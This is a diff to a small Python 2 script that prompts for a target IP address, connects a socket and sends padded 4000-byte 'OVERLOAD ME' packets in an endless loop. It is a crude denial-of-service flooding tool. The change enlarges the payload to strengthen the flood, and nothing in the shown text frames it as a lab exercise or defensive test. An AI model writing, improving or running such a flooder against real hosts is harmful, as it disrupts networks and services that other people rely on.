@@ -1,4 +1,5 @@
 import socket
+import struct
 
 def Main():
     ipaddr = raw_input('Type the IP below\n')
@@ -14,8 +15,9 @@ def Main():
    #     print received from ur ex  and str(received)
    #     message = raw_input(gimme more stuff to sendn)
    # sock.close()
+    data = struct.pack('4000s', 'OVERLOAD ME S..')
     while True:
-        sock.send("OVERLOAD ME S..")
+        sock.send(data)
 
 if __name__ == "__main__":
     Main()
